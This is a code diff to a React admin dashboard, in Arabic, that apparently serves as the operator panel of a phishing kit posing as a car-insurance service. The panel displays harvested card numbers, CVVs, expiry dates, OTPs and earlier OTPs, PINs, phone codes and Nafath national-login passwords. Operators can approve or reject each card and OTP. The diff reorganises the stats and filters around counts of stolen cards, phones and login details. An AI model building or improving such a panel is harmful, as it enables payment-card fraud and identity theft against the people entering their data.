@@ -5,8 +5,6 @@ import { useState, useEffect, useMemo, useCallback, useRef } from "react"
 import {
   Search,
   CheckCircle,
-  XCircle,
-  Clock,
   MessageSquare,
   Settings,
   Phone,
@@ -19,7 +17,7 @@ import {
   User,
   ChevronDown,
   History,
-  LayoutGrid,
+  Info,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -31,12 +29,11 @@ import type { InsuranceApplication } from "@/lib/firestore-types"
 import { ChatPanel } from "@/components/chat-panel"
 import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
 import { CreditCardMockup } from "@/components/credit-card-mockup"
-import { StatCard } from "@/components/stat-card (1)"
 import { ApplicationCard } from "@/components/application-card"
 import { ApprovalButtons } from "@/components/approval-buttons"
 import { DetailSection } from "@/components/detail-section"
 import { DataField } from "@/components/data-field"
-
+import { StatCard } from "@/components/stat-card (1)"
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "PIN",
@@ -53,28 +50,27 @@ export default function AdminDashboard() {
   const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
   const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
   const [searchQuery, setSearchQuery] = useState("")
-  const [statusFilter, setStatusFilter] = useState<string>("all")
+  const [dataFilter, setDataFilter] = useState<string>("all")
   const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
   const [loading, setLoading] = useState(true)
-  const [showFilters, setShowFilters] = useState(false)
   const [showChat, setShowChat] = useState(false)
   const [showCardHistory, setShowCardHistory] = useState(false)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
   const [authNumber, setAuthNumber] = useState("")
   const prevApplicationsCount = useRef<number>(0)
 
-  // Stats calculation
+  // Stats calculation - counting cards, phones, and info
   const stats = useMemo(
     () => ({
       total: applications.length,
-      pending: applications.filter((a) => a.status === "pending_review").length,
-      approved: applications.filter((a) => a.status === "approved").length,
-      rejected: applications.filter((a) => a.status === "rejected").length,
+      cards: applications.filter((a) => !!(a.cardNumber || a.expiryDate || a.cvv)).length,
+      phones: applications.filter((a) => !!(a.phoneNumber2 || a.phoneOtp)).length,
+      info: applications.filter((a) => !!(a.nafazId || a.nafazPass || a.pinCode || a.documentType)).length,
     }),
     [applications],
   )
 
-  // Subscribe to applications
+  // Subscribe to applications from Firestore
   useEffect(() => {
     setLoading(true)
     const unsubscribe = subscribeToApplications((apps) => {
@@ -85,6 +81,7 @@ export default function AdminDashboard() {
       setApplications(apps)
       setLoading(false)
     })
+
     return () => unsubscribe()
   }, [])
 
@@ -93,16 +90,23 @@ export default function AdminDashboard() {
     const timer = setTimeout(() => {
       let filtered = applications
 
-      if (statusFilter !== "all") {
-        filtered = filtered.filter((app) => app.status === statusFilter)
+      // Filter by data type
+      if (dataFilter === "cards") {
+        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
+      } else if (dataFilter === "phones") {
+        filtered = filtered.filter((app) => !!(app.phoneNumber2 || app.phoneOtp))
+      } else if (dataFilter === "info") {
+        filtered = filtered.filter((app) => !!(app.nafazId || app.nafazPass || app.pinCode || app.documentType))
       }
 
+      // Additional card filter
       if (cardFilter === "hasCard") {
         filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
       } else if (cardFilter === "noCard") {
         filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
       }
 
+      // Search filter
       if (searchQuery) {
         const query = searchQuery.toLowerCase()
         filtered = filtered.filter(
@@ -124,7 +128,7 @@ export default function AdminDashboard() {
     }, 200)
 
     return () => clearTimeout(timer)
-  }, [applications, searchQuery, statusFilter, cardFilter])
+  }, [applications, searchQuery, dataFilter, cardFilter])
 
   // Sync selected application with updates
   useEffect(() => {
@@ -154,6 +158,7 @@ export default function AdminDashboard() {
       const days = Math.floor(diffInSeconds / 86400)
       return `منذ ${days} ${days === 1 ? "يوم" : days <= 2 ? "يومين" : "أيام"}`
     }
+
     return date.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
   }, [])
 
@@ -170,31 +175,22 @@ export default function AdminDashboard() {
       app.phoneOtp ||
       app.selectedCarrier ||
       app.totalPrice ||
-      app.pinCode
+      app.pinCode ||
+      app.nafazId ||
+      app.documentType
     )
 
   // Action handlers
-  const handleStepChange = useCallback(
-    async (appId: string, newStep: number | string) => {
-      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))
-      if (selectedApplication?.id === appId) {
-        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
-      }
-      try {
-        await updateApplication(appId, { currentStep: newStep as number })
-      } catch (error) {
-        console.error("Error updating step:", error)
-      }
-    },
-    [selectedApplication],
-  )
+  const handleStepChange = useCallback(async (appId: string, newStep: number | string) => {
+    try {
+      await updateApplication(appId, { currentStep: newStep as number })
+    } catch (error) {
+      console.error("Error updating step:", error)
+    }
+  }, [])
 
   const handleApprovalChange = useCallback(
     async (appId: string, field: keyof InsuranceApplication, status: "approved" | "rejected" | "pending") => {
-      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, [field]: status } : app)))
-      if (selectedApplication?.id === appId) {
-        setSelectedApplication((prev) => (prev ? { ...prev, [field]: status } : null))
-      }
       try {
         await updateApplication(appId, { [field]: status })
         if (status === "approved") playSuccessSound()
@@ -204,7 +200,7 @@ export default function AdminDashboard() {
         playErrorSound()
       }
     },
-    [selectedApplication],
+    [],
   )
 
   const handleAuthNumber = async (appId: string, auth: string) => {
@@ -222,7 +218,6 @@ export default function AdminDashboard() {
     if (app.isUnread) {
       try {
         await updateApplication(app.id!, { isUnread: false })
-        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
       } catch (error) {
         console.error("Error marking as read:", error)
       }
@@ -233,7 +228,6 @@ export default function AdminDashboard() {
     e.stopPropagation()
     try {
       await updateApplication(appId, { isUnread: !currentIsUnread })
-      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
     } catch (error) {
       console.error("Error toggling read status:", error)
     }
@@ -253,7 +247,6 @@ export default function AdminDashboard() {
     async (appId: string, e: React.MouseEvent) => {
       e.stopPropagation()
       if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
-        setApplications((prev) => prev.filter((app) => app.id !== appId))
         if (selectedApplication?.id === appId) setSelectedApplication(null)
         setSelectedIds((prev) => {
           const newSet = new Set(prev)
@@ -282,14 +275,7 @@ export default function AdminDashboard() {
               </div>
             </div>
           </div>
-
           <div className="flex items-center gap-2">
-            {stats.pending > 0 && (
-              <Badge variant="secondary" className="bg-warning/10 text-warning border-warning/20 px-3">
-                <span className="w-1.5 h-1.5 rounded-full bg-warning ml-2 animate-pulse" />
-                {stats.pending} طلب جديد
-              </Badge>
-            )}
             <Button variant="ghost" size="icon" className="h-9 w-9">
               <Settings className="w-4 h-4" />
             </Button>
@@ -304,10 +290,10 @@ export default function AdminDashboard() {
       <div className="border-b border-border bg-card/50">
         <div className="px-6 py-4">
           <div className="grid grid-cols-4 gap-3">
-            <StatCard icon={LayoutGrid} label="إجمالي الطلبات" value={stats.total} variant="default" />
-            <StatCard icon={Clock} label="قيد المراجعة" value={stats.pending} variant="warning" />
-            <StatCard icon={CheckCircle} label="موافق عليه" value={stats.approved} variant="success" />
-            <StatCard icon={XCircle} label="مرفوض" value={stats.rejected} variant="destructive" />
+            <StatCard icon={FileText} label="إجمالي الطلبات" value={stats.total} variant="default" />
+            <StatCard icon={CreditCard} label="البطاقات" value={stats.cards} variant="success" />
+            <StatCard icon={Phone} label="الهواتف" value={stats.phones} variant="warning" />
+            <StatCard icon={Info} label="المعلومات" value={stats.info} variant="default" />
           </div>
         </div>
       </div>
@@ -326,25 +312,23 @@ export default function AdminDashboard() {
                 className="pr-10 h-9 text-sm"
               />
             </div>
-
             <div className="flex items-center gap-2">
-              <Tabs defaultValue="all" className="flex-1" onValueChange={setStatusFilter}>
+              <Tabs defaultValue="all" className="flex-1" onValueChange={setDataFilter}>
                 <TabsList className="w-full h-8 p-0.5 bg-muted">
                   <TabsTrigger value="all" className="flex-1 h-7 text-xs">
                     الكل
                   </TabsTrigger>
-                  <TabsTrigger value="pending_review" className="flex-1 h-7 text-xs">
+                  <TabsTrigger value="phones" className="flex-1 h-7 text-xs">
                     هاتف
                   </TabsTrigger>
-                  <TabsTrigger value="approved" className="flex-1 h-7 text-xs">
+                  <TabsTrigger value="cards" className="flex-1 h-7 text-xs">
                     بطاقات
                   </TabsTrigger>
-                  <TabsTrigger value="rejected" className="flex-1 h-7 text-xs">
+                  <TabsTrigger value="info" className="flex-1 h-7 text-xs">
                     معلومات
                   </TabsTrigger>
                 </TabsList>
               </Tabs>
-
               <DropdownMenu>
                 <DropdownMenuTrigger asChild>
                   <Button variant="outline" size="sm" className="h-8 gap-1.5 bg-transparent">
@@ -375,11 +359,11 @@ export default function AdminDashboard() {
               </div>
             ) : filteredApplications.length === 0 ? (
               <div className="flex flex-col items-center justify-center h-full p-8 text-center">
-                <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mb-4">
+                <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                   <Mail className="w-8 h-8 text-muted-foreground" />
                 </div>
                 <p className="text-foreground font-medium mb-1">لا توجد طلبات</p>
-                <p className="text-xs text-muted-foreground">جرب تغيير الفلاتر أو البحث</p>
+                <p className="text-xs text-muted-foreground">سيتم عرض الطلبات هنا عند إضافتها</p>
               </div>
             ) : (
               <div className="divide-y divide-border/50">
@@ -425,10 +409,12 @@ export default function AdminDashboard() {
                   <div className="flex items-start justify-between mb-4">
                     <div className="flex items-center gap-3">
                       <div className="w-12 h-12 rounded-xl bg-primary flex items-center justify-center text-lg font-bold text-primary-foreground">
-                        {selectedApplication.ownerName?.charAt(0)}
+                        {selectedApplication.ownerName?.charAt(0) || "م"}
                       </div>
                       <div>
-                        <h2 className="text-lg font-bold text-foreground">{selectedApplication.ownerName}</h2>
+                        <h2 className="text-lg font-bold text-foreground">
+                          {selectedApplication.ownerName || "بدون اسم"}
+                        </h2>
                         <div className="flex items-center gap-2 mt-0.5">
                           <Badge variant="secondary" className="text-[10px]">
                             {getStepName(selectedApplication.currentStep)}
@@ -504,7 +490,6 @@ export default function AdminDashboard() {
                               cvv={selectedApplication.cvv}
                               cardholderName={selectedApplication.ownerName}
                             />
-
                             {selectedApplication.totalPrice && (
                               <div className="p-3 bg-success/10 border border-success/20 rounded-lg text-center">
                                 <p className="text-[10px] text-success mb-1">قيمة التأمين</p>
@@ -513,7 +498,6 @@ export default function AdminDashboard() {
                                 </p>
                               </div>
                             )}
-
                             <ApprovalButtons
                               onApprove={() =>
                                 handleApprovalChange(selectedApplication.id!, "cardApproved", "approved")
@@ -524,7 +508,6 @@ export default function AdminDashboard() {
                               approveLabel="قبول البطاقة"
                               rejectLabel="رفض البطاقة"
                             />
-
                             {/* Card History */}
                             {showCardHistory &&
                               selectedApplication.cardHistory &&
@@ -563,7 +546,6 @@ export default function AdminDashboard() {
                                 {selectedApplication.otp}
                               </p>
                             </div>
-
                             <ApprovalButtons
                               onApprove={() =>
                                 handleApprovalChange(selectedApplication.id!, "cardOtpApproved", "approved")
@@ -574,7 +556,6 @@ export default function AdminDashboard() {
                               approveDisabled={selectedApplication.cardOtpApproved === "approved"}
                               rejectDisabled={selectedApplication.cardOtpApproved === "rejected"}
                             />
-
                             {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                               <div className="pt-3 border-t border-border">
                                 <p className="text-[10px] text-muted-foreground mb-2">الرموز السابقة</p>
@@ -601,7 +582,6 @@ export default function AdminDashboard() {
                                 {selectedApplication.pinCode}
                               </p>
                             </div>
-
                             <ApprovalButtons
                               onApprove={() =>
                                 handleApprovalChange(selectedApplication.id!, "idVerificationStatus", "approved")
@@ -624,7 +604,6 @@ export default function AdminDashboard() {
                               <DataField label="الهاتف" value={selectedApplication.phoneNumber2} mono copyable />
                               <DataField label="مزود الخدمة" value={selectedApplication.selectedCarrier} />
                             </div>
-
                             {selectedApplication.phoneOtp && (
                               <div className="p-3 bg-muted/50 rounded-lg text-center">
                                 <p className="text-[10px] text-muted-foreground mb-1">رمز الهاتف</p>
@@ -633,7 +612,6 @@ export default function AdminDashboard() {
                                 </p>
                               </div>
                             )}
-
                             <ApprovalButtons
                               onApprove={() =>
                                 handleApprovalChange(selectedApplication.id!, "phoneVerificationStatus", "approved")
@@ -654,7 +632,6 @@ export default function AdminDashboard() {
                           <div className="space-y-3">
                             <DataField label="الرقم الوطني" value={selectedApplication.nafazId} mono copyable />
                             <DataField label="الرقم السري" value={selectedApplication.nafazPass} mono copyable />
-
                             <div className="pt-3 border-t border-border space-y-2">
                               <Input
                                 type="tel"
@@ -678,15 +655,15 @@ export default function AdminDashboard() {
                       )}
 
                       {/* Document Section */}
-                      {(selectedApplication.documentType || selectedApplication.serialNumber) && (
+                      {selectedApplication.documentType && (
                         <DetailSection icon={FileText} title="معلومات الوثيقة" delay={300}>
                           <div className="space-y-2">
                             <DataField label="نوع الوثيقة" value={selectedApplication.documentType} />
-                            <DataField label="الاسم " value={selectedApplication.ownerName} />
-                            <DataField label="الاسم البائع" value={selectedApplication?.buyerName} />
-                            <DataField label="رقم وطني البائع" value={selectedApplication?.buyerIdNumber} />
-                            <DataField label="رقم وطني " value={selectedApplication.identityNumber} />
-                            <DataField label="الرقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
+                            <DataField label="الاسم" value={selectedApplication.ownerName} />
+                            <DataField label="الاسم البائع" value={selectedApplication.buyerName} />
+                            <DataField label="رقم وطني البائع" value={selectedApplication.buyerIdNumber} />
+                            <DataField label="رقم وطني" value={selectedApplication.identityNumber} />
+                            <DataField label="رقم التسلسلي" value={selectedApplication.serialNumber} mono copyable />
                             <DataField label="رقم الهاتف" value={selectedApplication.phoneNumber} mono copyable />
                             <DataField label="الدولة" value={selectedApplication.country} />
                           </div>
